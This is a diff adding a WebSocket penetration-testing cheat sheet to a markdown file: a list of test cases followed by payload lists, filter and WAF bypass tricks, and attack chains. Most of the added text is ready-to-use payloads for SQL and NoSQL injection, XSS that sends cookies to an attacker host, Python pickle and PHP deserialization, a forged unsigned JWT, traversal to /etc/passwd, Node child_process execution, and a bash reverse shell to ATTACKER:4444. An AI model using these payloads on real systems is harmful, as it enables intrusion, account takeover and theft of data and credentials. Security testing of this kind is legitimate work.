@@ -1,3 +1,250 @@
+# **✅ WebSockets Security Testing – Complete Test Case (with Bypass Cases)**
+
+1 No Authentication on WebSocket Upgrade
+
+2 Weak / Missing Origin Validation (Origin Spoofing)
+
+3 Cross-Site WebSocket Hijacking (CSWSH)
+
+4 Message Tampering (No Signature / MAC)
+
+5 WebSocket Injection (WS Command Injection)
+
+6 WebSocket-based SQL/NoSQL Injection
+
+7 WebSocket XSS Payload Reflection
+
+8 Binary Message Injection
+
+9 WebSocket CSRF (WSS/WS Hijacking)
+
+10 Insecure WebSocket Server (Unauthenticated APIs)
+
+11 JSON Deserialization Attacks over WebSocket
+
+12 WebSocket Protocol Downgrade (wss → ws)
+
+13 Bruteforcing Over WebSockets
+
+14 WebSocket Message Flood / DoS
+
+15 WebSocket Misconfiguration → RCE (Node.js)
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+*(Normal structured payload list)*
+
+```
+2.1 Basic Connection Attempt Without Auth
+GET /ws HTTP/1.1
+Upgrade: websocket
+Connection: Upgrade
+Host: victim.com
+```
+
+```
+2.2 Spoofed Origin Header
+Origin: https://attacker.com
+```
+
+```
+2.3 WebSocket Message Tampering
+{"action":"getUser","id":"1 OR 1=1"}
+```
+
+```
+2.4 WebSocket JSON Injection
+{"cmd":"subscribe","channel":"notifications;DROP TABLE users;"}
+```
+
+```
+2.5 WebSocket JS Injection (Reflected)
+{"msg":"<img src=x onerror=alert(1)>"}
+```
+
+```
+2.6 Binary Injection Payload
+\x00\x01\x02\x03\xFF
+```
+
+```
+2.7 Unauthorized Channel Subscription
+{"subscribe":"adminChannel"}
+```
+
+```
+2.8 Bruteforce / Enumeration Message
+{"action":"getUser","id":"1001"}
+```
+
+```
+2.9 File Read Attempt via WS Command
+{"action":"read","path":"../../etc/passwd"}
+```
+
+```
+2.10 WS Downgrade Attack
+ws://victim.com/ws (instead of wss://)
+```
+
+---
+
+# **3. Sample Payloads (Updated With Real Offensive Payloads)**
+
+*(Real exploitation payloads used in WebSocket attacks)*
+
+```
+3.1 Full SQL Injection via WebSocket API
+{"query":"SELECT * FROM users WHERE id=1 UNION SELECT null,username,password FROM users"}
+```
+
+```
+3.2 NoSQL Injection via WS
+{"filter":{"$ne":null},"password":{"$ne":""}}
+```
+
+```
+3.3 RCE in Node.js WebSocket Handler
+{"action":"exec","cmd":"require('child_process').exec('id')"}
+```
+
+```
+3.4 XSS via WebSocket Chat App
+{"message":"<script>fetch('//attacker/c?'+document.cookie)</script>"}
+```
+
+```
+3.5 JWT Manipulation Over WS
+{"token":"eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."}
+```
+
+```
+3.6 Admin Channel Unauthorized Join
+{"room":"admin","action":"join"}
+```
+
+```
+3.7 Exfiltration Over WebSocket Channel
+{"upload":"/etc/passwd"}
+```
+
+```
+3.8 CSRF WebSocket Hijacking
+new WebSocket("wss://victim.com/ws");
+```
+
+```
+3.9 Python Pickle Payload via WebSocket
+cos
+system
+(S"id")
+tR.
+```
+
+```
+3.10 Serialized PHP Object Injection Via WS
+O:8:"Exploit":1:{s:3:"cmd";s:2:"id";}
+```
+
+---
+
+# **4. Bypass Techniques (Origin, Filters, WAF, Sanitization)**
+
+*(Same style as before — bypass payloads only)*
+
+```
+4.1 Origin Spoof Bypass
+Origin: null
+```
+
+```
+4.2 CORS Misconfig Bypass
+Origin: https://allowed.com.attacker.com
+```
+
+```
+4.3 Case-Insensitive Origin Header Bypass
+oRiGiN: https://attacker.com
+```
+
+```
+4.4 WebSocket Subprotocol Bypass
+Sec-WebSocket-Protocol: chat, attacker-proto
+```
+
+```
+4.5 Message Chunking Bypass
+{"ac
+tion":"get
+User","id":"1"}
+```
+
+```
+4.6 Base64 Encoded Payloads
+eyJhY3Rpb24iOiJnZXRVc2VyIiwiaWQiOiIxIn0=
+```
+
+```
+4.7 Double-JSON Encoding
+"{\"action\":\"getUser\",\"id\":\"1 OR 1=1\"}"
+```
+
+```
+4.8 Unicode Obfuscation
+{"action":"getUser","\u0069d":"1"}
+```
+
+```
+4.9 WS Compression Bypass (WebSocket-PerMessage-Deflate)
+compressed malicious payload
+```
+
+```
+4.10 Protocol Downgrade (Force ws)
+ws://victim.com/ws
+```
+
+---
+
+# **5. Advanced Attack Chains (Real-World CSWSH / RCE Chains)**
+
+```
+5.1 WebSocket → CSRF → Account Takeover
+Attacker site forces victim browser to connect:
+new WebSocket("wss://victim/ws");
+```
+
+```
+5.2 WebSocket → NoSQL Injection → Dump Database
+{"filter":{"$gt":""}}
+```
+
+```
+5.3 WebSocket → Command Injection → Server RCE
+{"cmd":";bash -i >& /dev/tcp/ATTACKER/4444 0>&1"}
+```
+
+```
+5.4 WebSocket → XSS → Cookie Theft
+{"msg":"<script>new Image().src='//attacker/c?'+document.cookie</script>"}
+```
+
+```
+5.5 WebSocket → Prototype Pollution → Node RCE
+{"__proto__":{"exec":"require('child_process').exec('id')"}}
+```
+
+```
+5.6 WebSocket → Path Traversal → File Read
+{"path":"../../../../etc/passwd"}
+```
+
+```
+5.7 WebSocket → JWT Forgery → Privilege Escalation
+{"token":"header.payload."}
+```
+---
 
 # Manipulating WebSocket messages to exploit vulnerabilities
 
